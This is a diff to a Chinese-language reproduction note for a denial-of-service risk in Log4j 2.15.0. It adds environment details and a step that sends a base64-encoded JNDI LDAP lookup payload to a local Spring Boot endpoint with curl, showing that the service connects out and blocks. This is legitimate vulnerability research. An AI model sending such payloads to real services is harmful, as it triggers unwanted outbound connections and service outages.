@@ -14,6 +14,11 @@ Log4j2.15.0 有DOS风险。
 
 ## 复现 
 
+### 环境信息
+- JDK 8 275
+- log4j 2.15.0
+- Springboot 2.6.1
+
 ### 第一种情况
 在`log4j2.xml`中配置
 ```xml
@@ -68,7 +73,8 @@ Log4j2.15.0 有DOS风险。
 
 1. 本地起一个http服务，python -m http.server 7777
 
-2. 发起payload
+2. 本地使用log4j2.xml配置，起动springboot，发送payload到接口触发写入日志，发现服务尝试连接http://127.0.0.1:7777
+
 curl http://127.0.0.1:8080/test\?message\=JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6Nzc3N30=
 
 3. 查看console和http记录，可以发现请求keep alive, 被阻塞了，故存在dos风险
